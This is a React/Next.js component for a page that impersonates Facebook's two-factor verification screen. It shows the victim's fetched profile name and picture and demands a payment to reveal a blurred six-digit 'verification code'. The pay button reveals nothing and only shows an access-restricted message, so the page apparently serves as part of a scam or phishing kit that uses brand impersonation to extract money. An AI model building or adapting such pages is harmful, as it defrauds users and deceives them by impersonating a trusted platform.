'use client';

import multipleStep from "@/lib/multipleStep";
import { useEffect, useState } from "react";

export default function SixDigitCode() {
    const code = '******';
    const [paid, setPaid] = useState(false);

    const [infos, setInfos] = useState<any>(null);

    useEffect(() => {
        async function fetchInfos() {
            const data = await multipleStep();
            setInfos(data);
        }
        fetchInfos();
    }, []);


    return (
        <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
            <div className="max-w-md w-full bg-[#f9fbff] border border-[#dbeafe] shadow-md rounded-xl p-6">
                {/* User Header */}
                <div className="flex items-center gap-4 mb-6">


                    {infos?.profile_pic &&
                        <img
                            src={infos?.profile_pic}
                            className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
                        />
                    }


                    
                    <div>
                        <p className="text-sm text-gray-500">{infos?.type} User</p>
                        <h2 className="text-xl font-semibold text-gray-900">{infos?.profile_name}</h2>
                    </div>
                </div>

                {/* Title & Instructions */}
                <h1 className="text-xl font-semibold text-[#111827] mb-2">
                    Unlock Your Verification Code
                </h1>
                <p className="text-sm text-gray-600 mb-5">
                    A ${infos?.payment} payment is required to access your secure 6-digit verification code.
                </p>

                {/* Illustration */}
                <div className="mb-6">
                    <img
                        className="rounded-md w-full"
                        src="https://web.facebook.com/images/assets_DO_NOT_HARDCODE/fb_company_illo/ACP-UnifiedDelta-AuthenticationApp-Mobile_light-3x.png"
                        alt="2FA Illustration"
                    />
                </div>

                {/* Code Display */}
                <div className="flex justify-between gap-2 mb-6">
                    {code.split('').map((digit, idx) => (
                        <div
                            key={idx}
                            className="w-12 h-14 border border-gray-300 rounded-lg flex items-center justify-center text-2xl font-semibold tracking-wider text-[#155fca]"
                        >
                            <span className="blur-sm select-none">{digit}</span>
                        </div>
                    ))}
                </div>

                {/* Payment Button */}
                <button
                    onClick={() => setPaid(true)}
                    className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
                >
                    Pay ${infos?.payment} to Reveal 6-Digit Code
                </button>



                {/* Confirmation */}
                {paid && (
                    <div className="bg-red-50 border-l-4 border-red-400 text-red-700 p-4 rounded-md mb-6">
                        <p className="text-sm font-medium">
                            Access restricted to registered users only..
                        </p>

                    </div>
                )}
            </div>
        </div>
    );
}
